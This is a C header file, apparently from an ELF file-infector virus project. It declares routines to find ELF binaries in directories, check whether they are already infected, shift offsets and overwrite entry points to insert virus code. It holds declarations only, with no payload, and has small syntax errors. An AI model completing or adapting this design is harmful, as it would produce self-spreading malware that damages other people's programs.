#ifndef INFECTION_H
# define INFECTION_H

#include "elf.h"

/*
# include <stdlib.h>
# include <unistd.h>
# include <fcntl.h>
# include <sys/types.h>
# include <sys/stat.h>
# include <dirent.h>
# include <string.h>
# include <stdio.h>
# include <sys/mman.h>
*/

#define _GNU_SOURCE //GNU lib gives acces to useful macros

#define ELF_x32             0x0
#define ELF_x64             0x1

#define PAGE_SIZE           0x1000

struct                      linux_dirent_x64
{
    ino_t                   d_ino;      /* 64 bits inode number */
    off_t                   d_off;      /* 64 bits offset to next struct */
    unsigned short          d_reclen;   /* Actual dirent size */
    unsigned char           d_type;     /* File type */
    char                    d_name[];   /* filename */
};



/*
**      --> UTILS AND FILE PARSE METHODS
*/
char                        is_directory(const char *filename);
char                        is_file(const char *filename);
unsigned long               mtrx2d_len(char **str);
char                        mtrx2d_add_elem(char **mtrx, char *elem);
char                        valid_elf_file(const char *path, int type);
void                        get_path(char *dir_name, char *file_name, char *dest[]);
char                        **get_elf_files(char **files, char *dir_path, int type);

/*
**      -> "SHARED"
*/
char                        check_header_sanity(char *map, int size);
char                        infect_folder_entry_point(char *self_name, const char *path);
char                        infect_all_targets(char *argv);



/*
**      -> ENTRY POINT INFECTION
*/
typedef struct              s_entry
{
    int                     fd;
    Elf64_Addr              offset;
    Elf64_Addr              original_entry;
    void                    *data;
    size_t                  padding;
    uint64_t                data_size;
    uint64_t                virus_size;
    Elf64_Phdr              *program;
    Elf64_Shdr              *section;
    Elf64_Phdr              *saved_program;
    Elf64_Shdr              *saved_section
}                           t_entry;

void                        find_text_section(t_entry *entry);
void                        find_entry_point(t_entry  *entry);
char                        is_not_infected(t_entry *entry, uint64_t signature);
char                        room_manager(t_entry *entry, uint64_t signature);
char                        shift_offsets(t_entry *entry);
char                        infection_entry_point(t_entry *entry, uint64_t signature, uint32_t virus_size, const char *path);
char                        write_entry_point_infection(t_entry *entry, uint32_t siganture, uint32_t virus);

#endif